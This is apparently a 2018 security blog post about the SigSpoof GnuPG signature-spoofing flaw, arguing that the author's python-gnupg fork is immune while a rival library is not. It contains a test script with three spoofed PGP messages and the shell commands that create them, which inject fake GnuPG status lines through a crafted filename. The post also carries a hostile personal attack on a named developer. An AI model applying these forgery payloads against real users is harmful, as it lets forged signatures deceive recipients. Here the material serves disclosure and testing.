Title: Pretty Bad {Protocol,People}
Date: 2018-06-13 15:29
Modified: 2018-06-13 20:55
Tags: security
Category: hacking
Author: isis agora lovecruft
Image: /static/images/2018/06/sigspoof.png

<!-- PELICAN_BEGIN_SUMMARY -->

**tl;dr:** This vulnerability affects GnuPG and several plugins and wrapper
  libraries, including
  [Vinay Sajip's](https://bitbucket.org/vinay.sajip/python-gnupg/)
  "python-gnupg" which I
  [rewrote](https://github.com/isislovecruft/python-gnupg) many years ago after
  finding a shell injection vulnerability in his code.  His code is vulnerable
  to SigSpoof; mine isn't.

Markus Brinkmann, a NeoPG developer,
[wrote about a recent signature spoofing vulnerability](https://neopg.io/blog/gpg-signature-spoof/)
in GnuPG which carried over into several downstream plugins and wrapper
libraries—largely due to GnuPG's interface design which uses file descriptors,
and only file descriptors, to speak a custom, potentially binary but often
ascii, order dependent line protocol, whose line order, keywords, number of
fields, and other details are subject to change between minor point versions of
GnuPG.  If that sounds like a special hell invented by some sort of unholy
crossing between RMS and a rabid howler monkey: welcome to working with (or
rather, more likely, around) the Terrible Idea Generator known as the GnuPG
development team.

<!-- PELICAN_END_SUMMARY -->

As previously mentioned, while working with Riseup¹ folks on a project, we found
a shell injection vulnerability in
[Vinay Sajip's python-gnupg module](https://bitbucket.org/vinay.sajip/python-gnupg/)
(the one that installs if you do `pip install python-gnupg`; mine installs with
`pip install gnupg`).  The fix was *not* merely to remove `shell=True` argument
passed to a call to `subprocess.Popen()` as Vinay believed (and continues to
believe)—but instead, to
[sanitise all inputs](https://github.com/isislovecruft/python-gnupg/blob/e82eb20d70d874b68858ccb686318ef3c1c07c8b/gnupg/_parsers.py#L127)
and
[whitelist available options](https://github.com/isislovecruft/python-gnupg/blob/e82eb20d70d874b68858ccb686318ef3c1c07c8b/gnupg/_parsers.py#L246).
There are hundreds of flags to the gnupg binary.  Some flags and options are
safe. Others can be, if you carefully sanitise their arguments.  Others must be
disallowed entirely.

[My python-gnupg module](https://github.com/isislovecruft/python-gnupg) isn't
vulnerable to SigSpoof, for several reasons:

1. `--no-options` is passed by default.  So if you've got something stupid in
   your `gpg.conf` file, you'll still be fine while using my Python module.

2. `--verbose` is not passed.  This means that my library doesn't have to wade
   throught a mixture of strange stderr and GnuPG status-fd messages on the same
   file descriptor.  You *could* pass `--verbose` to it manually, as it is in
   the list of allowable, whitelisted options, but the exploit still won't work,
   which brings us to our next point:

3. All inputs to, and outputs from, the gnupg binary are sanitised and then
   forced to conform to whitelists.  This means that, even if you did pass
   `--verbose` manually, the filename trick won't work because there's no way to
   safely sanitise a filename, because filenames may be arbitrary bytes.

Amusingly, the [front page](https://gnupg.readthedocs.io/en/0.4.3/) of Vinay's
current documentation states:

</p>
<span style="align:left; float:left; width:100%;">
  <table style="float:left; clear:left; width:100%; margin: 1px;">
    <tbody>
      <tr>
        <td style="text-align:center; padding: 1px;">
          <a href="./static/images/2018/06/vinays-python-warning.png">
            <img alt="" style="width: 500px;"
                 src="./static/images/2018/06/vinays-python-warning.png" />
          </a>
        </td>
      </tr>
    </tbody>
  </table>
</span>
</p><br /><p>

Which beautifully demonstrates that Vinay still doesn't understand the
original bug report.  Additionally, not a single line of his original
code remains unchanged, as the bulk of it was badly written and
contained hidden landmines.

At the time I pointed out the vulnerability, Vinay argued that it wasn't a bug
until a working exploit for a Bitcoin exchange C&C server, which was
unfortunately running his code, was released.  Vinay released several versions
of his library at the time,
[without making the version controlled repo available](http://seclists.org/oss-sec/2014/q1/243),
meaning that for each new version he claimed to have "fixed the bug", I had to
diff the tarballs to discover, unsurprisingly, that he had, in fact, not.

I find it difficult to convey how thoroughly unimpressed I am with men like
Vinay.  I volunteered the work, handed him an explanation and a solution, and
was ridiculed, told I was wrong, that I didn't understand, and ignored.  He's
still never credited me by name anywhere for finding the original bug.  Men like
this make me want to go write closed source code that none of you will ever see,
just so that I never have to deal with these GNU/Beardos ever again.  Have fun
with the bugs, Vinay, they'll certainly keep coming.

# Test it yourself

[Here is a script](https://gist.github.com/5050d4e5a2d5f23ebf3471dd711e329b)
which will print the status-fd output of GnuPG and test a spoofed signature
(PoC #1), a spoofed signature plus a falsely encrypted (i.e. appears to have been
encrypted to the user, when in fact no encryption was used) message (PoC #2),
and an additional method for signature spoofing (PoC #3):

<pre class="prettyprint lang-py">
    #!/usr/bin/env python
    #
    # Test whether python-gnupg (https://github.com/isislovecruft/python-gnupg),
    # is vulnerable to SigSpoof.
    #
    # Authors: isis agora lovecruft <isis@patternsinthevoid.net>

    from __future__ import print_function

    import gnupg

    # Set the gnupg log level to `--debug-level=guru` (lmao).
    log = gnupg._logger.create_logger(9)
    log.setLevel(9)

    # Create our gpg instance
    gpg = gnupg.GPG(binary="/usr/bin/gpg2")

    poc1msg = '''\
    -----BEGIN PGP MESSAGE-----

    hQIMAwxKj89n7yVcARAAkhbztv+rjtUZx4rSqpvlj8a9g+y+8ZOY8JhBFvJzVAXe
    tnBNDGmIAc9I9ewRgxwsgcCIlUuGYCSgFugWLYVPD+e0tyQwx76mpMZc5wqAMows
    mk2pavdYMD2FGePY9mCVDvpC8ldumVn2dgT0k2IIOVr8w29CRgzP8ONwAyFFr4Gw
    hZ82e+CLKMFOv7Aigp00D1esurNTzFN5MDJZqhQtPpXawexUjrl5GEsPtKLDkKyt
    iOR5HauLLlDPZJXhHqwrqbSKTpKJU9lztmFp3XVom6VgeCiHWcL0mYF2fcbzfJS/
    CjDFZqFmFPGUJSpdgDcGEGsalzk6o8RFtUvvmKtQLN9BglpYkyPXQiO8vCyS4xiN
    D0gjBxVSvvkdS7734FYxePkUDEOTQbPuJ+FzgMN6Jpp8hVopYbefVcU5bNIY4H2P
    9EAHgvX1AT+VtPPt0JxzQ5/UdXK5KE7O7zUtTJIkXd4hGFpWyZp8hTUEgqLHfHUw
    Qlso2hQ+xgqok1ruGRjYk7n48Uw89jYpBXCOJerZeQGrmGWEkuf1vonFVwddM/4p
    msPN9I6Ahf+Uth+U5rFO4Y2G5fk83saa6ZfM9qdZKgLLEOgXmyycAdSAq/vRRe1G
    z9W77qcuIdhi2dA6+CJBqkm97aYNvoQ4Mxt97e7nP5WijXwugumdMQ7oT1upIsbS
    wFQBov2rvuwWsqrw+kbPD+zedi0NP31BohjiEhBamohGkkh8gr4hPmiyJdm0TIfh
    GBo5z35kRQiJZ9DwmgxE+LnVWQvChEJt0NFuC5FqM5bBaOjR5b2QsYn5uZ5AnVTa
    OZj5HBaaZQqZod5FrGpVpmXG2+RThge8dCbx+CDdBWvLq99TppzcN5nGEHYaz41X
    1ZKRcpbUuixBn3juC6HN2iQq9BidAbpVWvTAYD4dH+/aio3fd+3wSCgHQnPRzxg9
    5YaF6XbFYO8ceruOmnzYYEQTBRmlrBbnaug/cDa5Yq4HIWDHRTR9/aK4Y9rcYsoK
    Jm+7ujLey3TsI9qMs3cbcmsZbnXm+v3uDLvGBofG/dAjqVvm074=
    =UN+a
    -----END PGP MESSAGE-----
    '''

    result1 = gpg.verify(poc1msg)
    print("[poc1] Was the spoofed signature valid? %r" % result1.valid)

    poc2msg = '''\
    -----BEGIN PGP MESSAGE-----

    y8BvYv8nCltHTlVQRzpdIEdPT0RTSUcgRjJBRDg1QUMxRTQyQjM2OCBQYXRyaWNr
    IEJydW5zY2h3aWcgPHBhdHJpY2tAZW5pZ21haWwubmV0PgpbR05VUEc6XSBWQUxJ
    RFNJRyBGMkFEODVBQzFFNDJCMzY4IHggMTUyNzcyMTAzNyAwIDQgMCAxIDEwIDAx
    CltHTlVQRzpdIFRSVVNUX0ZVTExZCltHTlVQRzpdIEJFR0lOX0RFQ1JZUFRJT04K
    W0dOVVBHOl0gREVDUllQVElPTl9PS0FZCltHTlVQRzpdIEVOQ19UTyBBM0FEQjY3
    QTJDREI4QjM1IDEgMApncGc6ICdbIaFeU2VlIHlvdSBhdCB0aGUgc2VjcmV0IHNw
    b3QgdG9tb3Jyb3cgMTBhbS4K
    =Qs3t
    -----END PGP MESSAGE-----
    '''

    result2 = gpg.decrypt(poc2msg)
    print("[poc2] Was the spoofed signature and encryption valid? %r"
          % result2.valid)
          
    poc3msg = '''\
    -----BEGIN PGP MESSAGE-----

    owJ42m2PsWrDMBiE9zzF1Uu2YDmJZYcQasV2oLRLHegQOij4txC1rGBZQ1+lT9M9
    79O5gkAppceNd8d318/H85dxaj5TF7VBo9UgJz8SjGwJR09gCR78gCRmGWK2CU7W
    KJ6wr5rjrfRH3ulB4bkp8EbvYDFfVnxViWUmyrRk+Yqne1FnVZGXos5rwVNWpJz/
    O6Wd8zQiOuu+v6euW9hRRbfkwdoW7ge3G61B9BJyWhoI3waGyQ7Y/q7uIpw63/ev
    mIfLp7vrhyGaYAhyCqDSzL4B9fBP7w==
    =zQV0
    -----END PGP MESSAGE-----
    '''

    result3 = gpg.verify(poc3msg)
    print("[poc3] Was the spoofed signature valid? %r" % result3.valid)
</pre>

The GnuPG blobs were generated with (via Markus Brinkmann's suggestions):

    ## PoC #1
    echo 'Please send me one of those expensive washing machines.' | \
    gpg --armor -r a3adb67a2cdb8b35 --encrypt --set-filename "`echo -ne \''\
    \n[GNUPG:] GOODSIG DB1187B9DD5F693B Patrick Brunschwig <patrick@enigmail.net>\
    \n[GNUPG:] VALIDSIG 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B 2018-05-31 1527721037 0 4 0 1 10 01 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B\
    \n[GNUPG:] TRUST_FULLY 0 classic\
    \ngpg: '\'`" > poc1.msg

    ## PoC #2
    echo "See you at the secret spot tomorrow 10am." | \
    gpg --armor --store --compress-level 0 --set-filename "`echo -ne \''\
    \n[GNUPG:] GOODSIG F2AD85AC1E42B368 Patrick Brunschwig <patrick@enigmail.net>\
    \n[GNUPG:] VALIDSIG F2AD85AC1E42B368 x 1527721037 0 4 0 1 10 01\
    \n[GNUPG:] TRUST_FULLY\
    \n[GNUPG:] BEGIN_DECRYPTION\
    \n[GNUPG:] DECRYPTION_OKAY\
    \n[GNUPG:] ENC_TO 50749F1E1C02AB32 1 0\
    \ngpg: '\'`" > poc2.msg

    # PoC #3
    echo 'meet me at 10am' | gpg --armor --store --set-filename "`echo -ne msg\''\
    \ngpg: Signature made Tue 12 Jun 2018 01:01:25 AM CEST\
    \ngpg:                using RSA key 1073E74EB38BD6D19476CBF8EA9DBF9FB761A677\
    \ngpg:                issuer "bill@eff.org"\
    \ngpg: Good signature from "William Budington <bill@eff.org>" [full]
    '\''msg'`" > poc3.msg

Again, not vulnerable, for all the reasons described above.

Additionally, if Vinay would have actually understood and fixed the root cause
of the original shell injection vulnerability six years ago, his library
likely wouldn't be vulnerable, yet again, today.  But of course, the GnuPG
community, just like upstream,
[really only takes patches from men](https://twitter.com/isislovecruft/status/811502983615840256),
so it's neither my problem nor concern that they seem to continually discover
new and innovative ways to fuck themselves and their users over.

# Please don't

If you're a developer thinking of making a new tool or product based on the
OpenPGP protocol: please don't.  Literally use anything else.  I wrote my
version of python-gnupg because, at the time, the project I worked on wanted to
make transparently encrypting remailers, i.e. middleware boxes run by an email
service provider which users register their encryption keys with, which
would—upon seeing a plaintext email to another of the provider's
users—automatically encrypt the email to the user.  We used GnuPG for this.
This was a mistake, in my opinion, and if I had to do the project again, I would
do it entirely differently.

If you're a developer thinking you can write a less shitty version of GnuPG:
please don't.  RFC4880 was a mistake and needs to die in a fire.  Also nobody
under thirty actually uses email for anything other than signing up for
services.

If you're a user or potential user of GnuPG: please don't.  Try using tools with
safer, constant-time cryptographic implementations, better code, nicer and more
inclusive development teams, and a better overall user experience, like
[Signal](https://signal.org/).

If you're considering getting into GnuPG development: please don't.  Especially
if you're non-cis-male identified, it's going to be a complete and infuriating
waste of your time and talents.  Please consider donating your skills to more
inclusive projects with fewer moronic assholes.

# Moving forward

There isn't really any path forward.  GnuPG and its underlying libgcrypt remain
some of the worst C code I've ever read.  The code isn't constant time, and
numerous attacks have resulted from this, as the developers scurry to jump
through hoops of fire to implement yet another variable-timed algorithm they've
seemingly come up with on the spot which is vulnerable to a dozen more attacks
*just not that one from the latest paper*. OpenPGP (RFC4880) is one of the worst
designs and specifications ever written.  I have to spend spots, here and there,
of my non-existent free time maintaining a whitelist as the GnuPG developers
randomly change their internal, nearly undocumented line protocol, between micro
versions.  I'd like to not do this.  Please, let's stop pretending this crock of
shit provides anything at all "pretty good": not the cryptographic algorithms,
not the code, not the user experience, and certainly not the goddamned IPC
design.

There is one way forward: Vinay is annoyed that my library has a similar name,
because *god forbid a user get tricked into using something more secure*.
Frankly, I'm sick of Vinay's trash code being mistaken for mine, and
increasingly so, the more vulnerabilities surface in it.  So I've decided to
rename the thing formerly installable with `pip install gnupg` to `pip install
pretty_bad_protocol` (name thanks to [boats](https://twitter.com/withoutboats)'
[pbp rust crate](https://github.com/withoutboats/pbp)).  If you grep for
`pretty_bad_protocol` in a python library which uses gnupg and there's no
results, you'll know someone's not being very honest about what gnupg has to
offer.

---

¹ I don't speak for my current or past employers or clients.
